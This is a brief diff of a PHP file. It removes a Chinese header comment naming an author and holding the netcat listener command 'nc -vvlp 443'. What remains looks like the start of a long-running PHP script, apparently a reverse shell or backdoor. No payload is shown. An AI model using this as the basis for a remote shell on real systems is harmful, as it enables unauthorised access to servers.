@@ -1,9 +1,4 @@
 <?php 
-/*******************************
- *兼容Windows & Linux
- *作者 Spider
- *nc -vvlp 443
-********************************/
 
 ignore_user_abort(true);
 ini_set('max_execution_time',0);
